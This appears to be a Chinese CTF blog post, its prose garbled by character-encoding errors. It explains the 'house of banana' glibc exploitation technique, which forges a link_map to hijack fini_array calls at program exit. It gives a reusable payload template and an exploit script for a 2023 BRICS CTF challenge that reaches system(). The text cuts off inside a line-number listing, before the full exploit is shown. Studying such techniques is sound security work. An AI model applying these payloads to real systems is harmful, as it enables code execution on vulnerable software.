<p>house_of_bananaæ˜¯ä¸€ç§å…¨ç‰ˆæœ¬é€šç”¨çš„é’ˆå¯¹link_mapçš„æ‰“æ³•ï¼Œå‡½æ•°åœ¨mainå‡½æ•°/ä¸»å‡½æ•°æ­£å¸¸è¿”å›æ—¶ä¼šè°ƒç”¨åˆ°fini_arrayç»“æ„ï¼Œæ¼æ´ä»£ç å°±åœ¨å…¶ä¸­ï¼Œæ•ˆæœæ˜¯å¯ä»¥æ‰§è¡Œä¸€å¤§æ®µgadgetsï¼Œç ´ååŠ›æ¯”èµ·apple2è¿˜è¦å¼ºï¼Œä½†æ˜¯å¯¹èƒ½å¤Ÿæ§åˆ¶çš„å†…å­˜é•¿åº¦æœ‰è¦æ±‚ï¼Œéœ€è¦æ§åˆ¶é•¿åº¦é•¿è¾¾0x320+ï¼Œè€Œapple2å¯ä»¥æ§åˆ¶åœ¨å¤šæ®µ0x100å†…</p>
<h1>æ‰“æ³•æ¨¡æ¿</h1>
<p>è°ƒè¯•çš„æ—¶å€™æœ€å¥½æŠŠaslrå…³äº†ï¼Œä¸è¿‡è¿˜å¾—æ³¨æ„æœ¬åœ°å’Œè¿œç¨‹ldåç§»ä¸ä¸€è‡´çš„é—®é¢˜</p>
<p><a target="_blank" rel="noopener" href="https://hkhanbing.github.io/2023/09/30/%E5%85%B3%E9%97%ADaslr%E8%BF%9B%E8%A1%8C%E8%B0%83%E8%AF%95/">å…³é—­aslrè¿›è¡Œè°ƒè¯• | hkbinçš„å°åšå®¢~ (hkhanbing.github.io)</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">house_of_banana</span>(<span class="params">fake_addr, l_next, gadget, count</span>):</span><br><span class="line">    fake_content = p64(<span class="number">0</span>) + p64(<span class="number">0</span>) <span class="comment"># l_addr keep zero to array</span></span><br><span class="line">    fake_content += p64(<span class="number">0</span>) + p64(l_next) <span class="comment"># l_next # check 1 for assert</span></span><br><span class="line">    fake_content += p64(<span class="number">0</span>) + p64(fake_addr) <span class="comment"># l_real == _ns_loaded # check 1 for assert</span></span><br><span class="line">    fake_content += p64(<span class="number">0x8</span>) <span class="comment"># check 3</span></span><br><span class="line">    fake_content += p64(<span class="number">0x8</span>) <span class="comment"># check 3</span></span><br><span class="line">    fake_content += p64(<span class="number">0x8</span>) <span class="comment"># check 3</span></span><br><span class="line">    fake_content = fake_content.ljust(<span class="number">0x48</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_content += p64(fake_addr + <span class="number">0x58</span>) <span class="comment"># l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</span></span><br><span class="line">    fake_content += p64(<span class="number">0x8</span> * count) <span class="comment"># gadgets count * 8 # l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span></span><br><span class="line">    fake_content += gadget <span class="comment"># reverse_gadget</span></span><br><span class="line">    fake_content = fake_content.ljust(<span class="number">0x110</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_content += p64(fake_addr + <span class="number">0x40</span>) <span class="comment"># l-&gt;l_info[DT_FINI_ARRAY]</span></span><br><span class="line">    fake_content += p64(<span class="number">0</span>) + p64(fake_addr + <span class="number">0x48</span>) <span class="comment">#l-&gt;l_info[DT_FINI_ARRAYSZ]</span></span><br><span class="line">    fake_content = fake_content.ljust(<span class="number">0x31c</span>, <span class="string">b&#x27;\x00&#x27;</span>) <span class="comment"># 0x31c / 0x314</span></span><br><span class="line">    fake_content += p64(<span class="number">0x1c</span>) <span class="comment"># check 2 to l_init_called</span></span><br><span class="line">    <span class="keyword">return</span> fake_content</span><br><span class="line"></span><br><span class="line">fake_addr = heap_base + <span class="number">0x490</span></span><br><span class="line">l_next = libc_base + (<span class="number">0x7ffff7ffe890</span> - <span class="number">0x7ffff7c00000</span>)</span><br><span class="line">ret_addr = libc_base + <span class="number">0x0000000000029cd6</span></span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">bin_addr = libc_base + <span class="number">0x00000000001d8698</span></span><br><span class="line">gadget = p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]) + p64(setcontext + <span class="number">306</span>) + p64(ret_addr) + p64(<span class="number">0</span>)*<span class="number">12</span> + p64(bin_addr)</span><br><span class="line"></span><br><span class="line">fake_content = house_of_banana(fake_addr + <span class="number">0x10</span>, l_next, gadget, <span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<h1>æ‰“æ³•åŸç†/éœ€è¦ç»•è¿‡çš„å„ç§æ ¡éªŒ</h1>
<h2 id="æºç åˆ†æ">æºç åˆ†æ</h2>
<p>æºç åœ¨ELFçš„dl-fini.cé‡Œï¼Œè¿™é‡Œå°±ä¸å…¨è´´äº†(åœ¨æ–‡ç« æœ€å)ï¼ŒæŒ‘æ ¡éªŒæ¥åˆ†æ</p>
<h3 id="ç¬¬ä¸€éƒ¨åˆ†éœ€è¦ç»•è¿‡çš„æ ¡éªŒ">ç¬¬ä¸€éƒ¨åˆ†éœ€è¦ç»•è¿‡çš„æ ¡éªŒ</h3>
<p>åœ¨ä»£ç çš„ç¬¬80è¡Œ</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (l == l-&gt;l_real)</span><br><span class="line">	      &#123;</span><br><span class="line">		<span class="keyword">assert</span> (i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">		maps[i] = l;</span><br><span class="line">		l-&gt;l_idx = i;</span><br><span class="line">		++i;</span><br><span class="line"></span><br><span class="line">		/* Bump l_direct_opencount of <span class="built_in">all</span> objects so that they</span><br><span class="line">		   are <span class="keyword">not</span> dlclose()ed <span class="keyword">from</span> underneath us.  */</span><br><span class="line">		++l-&gt;l_direct_opencount;</span><br><span class="line">	      &#125;</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸€éƒ¨åˆ†éœ€è¦ä¿æŒlâ†’l_realå’Œ_rtld_global._dl_ns._ns_loadedç»“æ„ä½“ä¸€è‡´ï¼Œè¿™æ˜¯ä¸ºäº†èƒ½å¤Ÿè¿‡æ‰åé¢çš„ä¸¤ä¸ªæ–­è¨€ï¼Œè¿™é‡Œçš„lè‡ªç„¶å°±æ˜¯_rtld_global._dl_ns._ns_loaded</p>
<p>æ•´ä¸ªlink_mapé“¾è¡¨çš„å…¥å£å°±æ˜¯_rtld_global._dl_ns._ns_loadedï¼Œç„¶åå†é€šè¿‡lâ†’nextæ¥è®¿é—®åˆ«çš„é“¾è¡¨ã€‚</p>
<p>é“¾è¡¨æ•°é‡ç”±è¿™ä¸ªå†³å®šï¼š_rtld_global._dl_ns._ns_nloaded</p>
<p>åŸæœ¬é»˜è®¤æ˜¯4ä¸ªï¼Œè€Œä¸”éƒ½èƒ½é€šè¿‡lâ†’l_real == lï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿè¦è®©æˆ‘ä»¬ä¼ªé€ çš„èƒ½é€šè¿‡</p>
<p><img src="./images/house_of_banana%207854a7baff6f446693bb8075cd8e0c0e/Untitled.png" alt="Untitled"></p>
<h3 id="ç¬¬äºŒéƒ¨åˆ†æ ¡éªŒ">ç¬¬äºŒéƒ¨åˆ†æ ¡éªŒ</h3>
<p>æˆ‘ä»¬çŸ¥é“åŸæ¥çš„å››ä¸ªé“¾è¡¨æ˜¯èƒ½é€šè¿‡è¿™ä¸¤ä¸ªæ–­è¨€æ ¡éªŒçš„</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">92</span>:<span class="keyword">assert</span> (ns != LM_ID_BASE || i == nloaded);</span><br><span class="line"><span class="number">93</span>:<span class="keyword">assert</span> (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<p>æ˜¾ç„¶è¿™ä¸¤ä¸ªæ ¡éªŒä¸é“¾è¡¨å®Œæ•´æ€§æœ‰å…³</p>
<p>åŸæ¥çš„å››ä¸ªé“¾è¡¨ï¼š</p>
<p>link_map1â†’link_map2â†’link_map3â†’link_map4â†’0x0</p>
<p>è€Œä¸”æ˜¯é€šè¿‡l_nextæ¥è¿›è¡Œé“¾æ¥çš„</p>
<p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬æ„é€ </p>
<p>fake_mapâ†’link_map2â†’link_map3â†’link_map4â†’0x0</p>
<p>å°±èƒ½é€šè¿‡æ ¡éªŒï¼</p>
<h3 id="ç¬¬ä¸‰éƒ¨åˆ†æ ¡éªŒ">ç¬¬ä¸‰éƒ¨åˆ†æ ¡éªŒ</h3>
<p>ç»è¿‡äº†å‰ä¸¤éƒ¨åˆ†æ ¡éªŒä¹‹åï¼Œæˆ‘ä»¬å°±èƒ½è¿›å…¥æœ€æ ¸å¿ƒçš„ä»£ç äº†</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i)</span><br><span class="line">	    &#123;</span><br><span class="line">	      struct link_map *l = maps[i];</span><br><span class="line"></span><br><span class="line">	      <span class="keyword">if</span> (l-&gt;l_init_called)</span><br><span class="line">		&#123;</span><br><span class="line">		  /* Make sure nothing happens <span class="keyword">if</span> we are called twice.  */</span><br><span class="line">		  l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line">		  /* Is there a destructor function?  */</span><br><span class="line">		  <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != NULL</span><br><span class="line">		      || (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != NULL))</span><br><span class="line">		    &#123;</span><br><span class="line">		      /* When debugging <span class="built_in">print</span> a message first.  */</span><br><span class="line">		      <span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask)</span><br><span class="line">					    &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">			_dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,</span><br><span class="line">					  DSO_FILENAME (l-&gt;l_name),</span><br><span class="line">					  ns);</span><br><span class="line">		      /* First see whether an array <span class="keyword">is</span> given.  */</span><br><span class="line">		      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != NULL)</span><br><span class="line">			&#123;</span><br><span class="line">			  ElfW(Addr) *array =</span><br><span class="line">			    (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">					    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">			  unsigned <span class="built_in">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">					    / sizeof (ElfW(Addr)));</span><br><span class="line">			  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">			    ((fini_t) array[i]) ();</span><br><span class="line">			&#125;</span><br><span class="line">		      /* Next <span class="keyword">try</span> the old-style destructor.  */</span><br><span class="line">		      <span class="keyword">if</span> (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != NULL)</span><br><span class="line">			DL_CALL_DT_FINI</span><br><span class="line">			  (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">		    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#ifdef SHARED</span></span><br><span class="line">		  /* Auditing checkpoint: another <span class="built_in">object</span> closed.  */</span><br><span class="line">		  _dl_audit_objclose (l);</span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯æ‰“åˆ° ((fini_t) array[i]) ();</p>
<p>è¿™é‡ŒåŒ–ç®€ä¸€ä¸‹ä»£ç å¥½çœ‹ç‚¹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> maps:</span><br><span class="line">	<span class="keyword">if</span> (l-&gt;l_init_called):</span><br><span class="line">		l-&gt;l_init_called = <span class="number">0</span></span><br><span class="line">		<span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != NULL </span><br><span class="line">				|| (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != NULL)):</span><br><span class="line">			<span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != NULL):</span><br><span class="line">				array = (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">					    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr)</span><br><span class="line">				i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">					    / sizeof (ElfW(Addr)))</span><br><span class="line">				<span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">			    ((fini_t) array[i]) ();</span><br><span class="line">			</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬éœ€è¦ä¸€è·¯èµ°ifï¼Œèµ°åˆ°whileå³å¯</p>
<p>æ‰€ä»¥æˆ‘ä»¬çš„l_init_calledéœ€è¦è®¾ä¸º1</p>
<p>è¿™ä¸ªä¸œè¥¿çš„åç§»åœ¨0x31cæˆ–è€…0x314ï¼Œå¡«ä¸º0x1cï¼Œæ ‡å¿—ä½å³å¯ä¸º1</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fake_content = fake_content.ljust(<span class="number">0x31c</span>, <span class="string">b&#x27;\x00&#x27;</span>) <span class="comment"># 0x31c / 0x314</span></span><br><span class="line">fake_content += p64(<span class="number">0x1c</span>) <span class="comment"># check 2 to l_init_called</span></span><br></pre></td></tr></table></figure>
<p>ç„¶åæ˜¯ç¬¬äºŒä¸ªifï¼š</p>
<p>å®å®šä¹‰ï¼š</p>
<p><img src="./images/house_of_banana%207854a7baff6f446693bb8075cd8e0c0e/Untitled%201.png" alt="Untitled"></p>
<p>ç»™l_infoå¯¹åº”çš„ä½ç½®å¡«ç‚¹ä¸œè¥¿å³å¯</p>
<p><strong>å¦‚æ­¤å³å¯ç»•è¿‡ç¬¬äºŒä¸ªifå’Œç¬¬ä¸‰ä¸ªifåˆ¤æ–­</strong></p>
<p>æœ€åæ˜¯ç¡®å®šarrayå’Œiçš„ä»£ç ï¼š</p>
<p>æˆ‘ä»¬è®¾ç½®lâ†’l_addrä¸º0ï¼Œåˆ™arrayä¸ºl-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</p>
<p>iä¸ºi = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val / sizeof (ElfW(Addr)))</p>
<p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†l_info[DT_FINI_ARRAY]æŒ‡å‘ä¸€ä¸ªå¯æ§çš„åœ°å€ï¼Œè¿™é‡ŒæŒ‡å‘fake_addr+0x40</p>
<p>l-&gt;l_info[DT_FINI_ARRAYSZ]æŒ‡å‘fake_addr + 0x48</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fake_content += p64(fake_addr + <span class="number">0x58</span>) <span class="comment"># l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</span></span><br><span class="line">fake_content += p64(<span class="number">0x8</span> * count) <span class="comment"># gadgets count * 8 # l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span></span><br><span class="line">fake_content += gadget <span class="comment"># reverse_gadget</span></span><br><span class="line">fake_content = fake_content.ljust(<span class="number">0x110</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_content += p64(fake_addr + <span class="number">0x40</span>) <span class="comment"># l-&gt;l_info[DT_FINI_ARRAY]</span></span><br><span class="line">fake_content += p64(<span class="number">0</span>) + p64(fake_addr + <span class="number">0x48</span>) <span class="comment">#l-&gt;l_info[DT_FINI_ARRAYSZ]</span></span><br></pre></td></tr></table></figure>
<h3 id="æ‰§è¡Œgadget">æ‰§è¡Œgadget</h3>
<p>ç»•è¿‡æ‰€æœ‰æ‰€æœ‰åˆ¤æ–­å’Œæ ¡éªŒä¹‹åï¼Œç»ˆäºå¯ä»¥æ‰§è¡Œgadgetäº†ï¼</p>
<p>ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ä»–æ˜¯while(iâ€”)ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„gadgetæ˜¯åè¿‡æ¥çš„ï¼Œä¹Ÿå°±æ˜¯å…ˆæ‰§è¡Œåé¢çš„gadgetï¼Œå†æ‰§è¡Œå‰é¢çš„gadgetã€‚</p>
<p>è€Œä¸”æœ‰ä¸€ä¸ªå°tipsï¼Œå®ƒä¼šå°†å‰é¢æ‰§è¡Œè¿‡çš„gadgetåœ°å€æ”¾åˆ°rdxé‡Œé¢</p>
<p>å†é…åˆä¸Š2.29+çš„setcontextï¼Œå¯ä»¥å®ç°æ§åˆ¶ç»å¤§éƒ¨åˆ†å¯„å­˜å™¨(æˆ‘ä»¬å¯æ§çš„gadgetsèŒƒå›´ä¸º0x110</p>
<p>æ²¡æœ‰æ ˆå¸§æƒ…å†µä¸‹ä¹Ÿåªèƒ½è€ƒè™‘setcontextå’ŒSROPå•¦(</p>
<h1>ä¾‹é¢˜</h1>
<p>æ¥è‡ª2023 bricsctf paintè¿™é“é¢˜</p>
<p>å‰é¢çš„leakå’Œæ¼æ´å°±ä¸åˆ†æäº†</p>
<p>ç›´æ¥house_of_bananaæ‰“æ³•</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;house_of_banana&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">_rtld_global = libc_base + (<span class="number">0x7ffff7ffd040</span> - <span class="number">0x7ffff7c00000</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">log</span>(hex(_rtld_global))</span><br><span class="line"></span><br><span class="line">fake_addr = heap_base + <span class="number">0x490</span></span><br><span class="line">l_next = libc_base + (<span class="number">0x7ffff7ffe890</span> - <span class="number">0x7ffff7c00000</span>)</span><br><span class="line">ret_addr = libc_base + <span class="number">0x0000000000029cd6</span></span><br><span class="line"></span><br><span class="line">def house_of_banana(fake_addr, l_next, gadget, count):</span><br><span class="line">    fake_content = p64(<span class="number">0</span>) + p64(<span class="number">0</span>) # l_addr keep zero to <span class="built_in">array</span></span><br><span class="line">    fake_content += p64(<span class="number">0</span>) + p64(l_next) # l_next <span class="meta"># check 1 for assert</span></span><br><span class="line">    fake_content += p64(<span class="number">0</span>) + p64(fake_addr) # l_real == _ns_loaded <span class="meta"># check 1 for assert</span></span><br><span class="line">    fake_content += p64(<span class="number">0x8</span>) <span class="meta"># check 3</span></span><br><span class="line">    fake_content += p64(<span class="number">0x8</span>) <span class="meta"># check 3</span></span><br><span class="line">    fake_content += p64(<span class="number">0x8</span>) <span class="meta"># check 3</span></span><br><span class="line">    fake_content = fake_content.ljust(<span class="number">0x48</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line">    fake_content += p64(fake_addr + <span class="number">0x58</span>) <span class="meta"># l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</span></span><br><span class="line">    fake_content += p64(<span class="number">0x8</span> * count) <span class="meta"># gadgets count * 8 # l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span></span><br><span class="line">    fake_content += gadget # reverse_gadget</span><br><span class="line">    fake_content = fake_content.ljust(<span class="number">0x110</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line">    fake_content += p64(fake_addr + <span class="number">0x40</span>) <span class="meta"># l-&gt;l_info[DT_FINI_ARRAY]</span></span><br><span class="line">    fake_content += p64(<span class="number">0</span>) + p64(fake_addr + <span class="number">0x48</span>) <span class="meta">#l-&gt;l_info[DT_FINI_ARRAYSZ]</span></span><br><span class="line">    fake_content = fake_content.ljust(<span class="number">0x31c</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>) # <span class="number">0x31c</span> / <span class="number">0x314</span></span><br><span class="line">    fake_content += p64(<span class="number">0x1c</span>) <span class="meta"># check 2 to l_init_called</span></span><br><span class="line">    <span class="keyword">return</span> fake_content</span><br><span class="line"></span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">bin_addr = libc_base + <span class="number">0x00000000001d8698</span></span><br><span class="line">gadget = p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]) + p64(setcontext + <span class="number">306</span>) + p64(ret_addr) + p64(<span class="number">0</span>)*<span class="number">12</span> + p64(bin_addr)</span><br><span class="line"></span><br><span class="line">fake_content = house_of_banana(fake_addr + <span class="number">0x10</span>, l_next, gadget, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0xf0</span>, <span class="number">1</span>)</span><br><span class="line">resize(<span class="number">3</span>, <span class="number">0xf0</span>, <span class="number">5</span>)</span><br><span class="line">fake_content = fake_content.ljust(<span class="number">0xf0</span> * <span class="number">5</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta"># edit(3, fake_content)</span></span><br><span class="line">sla(prefix, b<span class="number">&#x27;3&#x27;</span>)</span><br><span class="line">sla(<span class="string">&quot;Enter idx: &quot;</span>, str(<span class="number">3</span>))</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">5</span>):</span><br><span class="line">    sl(fake_content[<span class="number">0xf0</span>*i:<span class="number">0xf0</span>*(i+<span class="number">1</span>)])</span><br><span class="line"></span><br><span class="line">rate(<span class="number">-8</span>, <span class="number">1</span>, <span class="string">&#x27;y&#x27;</span>, p64(<span class="number">0xffffffffffff01ff</span>) + p64(_rtld_global))</span><br><span class="line">edit(<span class="number">-5</span>, p64(fake_addr + <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">bpp()</span><br><span class="line"><span class="built_in">exit</span>()</span><br></pre></td></tr></table></figure>
<p>è¦†ç›–æ‰_rtld_global._dl_ns._ns_loadedæ”¹åˆ°å¯æ§çš„heapåŒºï¼Œä¹‹åå¥—bananaå³å¯</p>
<p><strong>å®Œæ•´exp</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span 